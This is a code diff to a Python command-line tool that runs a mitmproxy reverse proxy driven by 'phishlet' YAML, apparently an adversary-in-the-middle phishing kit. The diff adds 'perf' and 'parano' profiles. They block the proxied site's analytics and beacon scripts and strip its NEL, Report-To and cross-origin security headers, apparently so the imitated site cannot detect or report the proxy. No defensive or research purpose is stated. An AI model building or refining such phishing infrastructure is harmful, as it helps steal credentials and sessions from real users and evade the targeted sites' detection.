@@ -154,7 +154,7 @@ def edge_preset(host, port):
 @click.option("--deny-ips", help="Liste CSV d'IPs refusées")
 @click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
 @click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
-@click.option("--profile", default="default", help="Profil (default|stealth)")
+@click.option("--profile", default="default", help="Profil (default|stealth|strict|perf|parano)")
 def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
     try:
         from core.edge.proxy import EdgeProxy, EdgeConfig
@@ -230,6 +230,58 @@ def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2,
                     os.environ["RATE_LIMIT_PER_MINUTE"] = "40"
             except Exception as e:
                 console.print(f"[yellow]Profil strict non appliqué: {e}[/yellow]")
+        elif p == "perf":
+            try:
+                data = yaml.safe_load(ph_yaml)
+                if not isinstance(data, dict):
+                    raise ValueError("phishlet YAML invalide")
+                bl = data.get("blocklist") or []
+                extra_bl = [
+                    {"pattern": "analytics|gtm", "mimes": ["text/javascript","application/javascript"], "max_kb": 1024},
+                ]
+                bl.extend(extra_bl)
+                data["blocklist"] = bl
+                hdrs = data.get("headers") or []
+                hdrs.extend([
+                    {"action": "remove", "name": "NEL"},
+                    {"action": "remove", "name": "Report-To"},
+                ])
+                data["headers"] = hdrs
+                ph_yaml = yaml.safe_dump(data, sort_keys=False)
+                if rate is None:
+                    os.environ["RATE_LIMIT_PER_MINUTE"] = "100"
+            except Exception as e:
+                console.print(f"[yellow]Profil perf non appliqué: {e}[/yellow]")
+        elif p == "parano":
+            try:
+                data = yaml.safe_load(ph_yaml)
+                if not isinstance(data, dict):
+                    raise ValueError("phishlet YAML invalide")
+                bl = data.get("blocklist") or []
+                extra_bl = [
+                    {"pattern": ".*", "mimes": ["video/"], "max_kb": 1},
+                    {"pattern": ".*", "mimes": ["image/"], "max_kb": 120},
+                    {"pattern": "fonts?|woff2|ttf", "mimes": ["font/"], "max_kb": 120},
+                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 180},
+                ]
+                bl.extend(extra_bl)
+                data["blocklist"] = bl
+                hdrs = data.get("headers") or []
+                hdrs.extend([
+                    {"action": "remove", "name": "NEL"},
+                    {"action": "remove", "name": "Report-To"},
+                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
+                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
+                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
+                    {"action": "remove", "name": "Permissions-Policy"},
+                ])
+                data["headers"] = hdrs
+                ph_yaml = yaml.safe_dump(data, sort_keys=False)
+                _profile_http2 = False
+                if rate is None:
+                    os.environ["RATE_LIMIT_PER_MINUTE"] = "30"
+            except Exception as e:
+                console.print(f"[yellow]Profil parano non appliqué: {e}[/yellow]")
         # Environnement réseau
         if rate is not None:
             os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
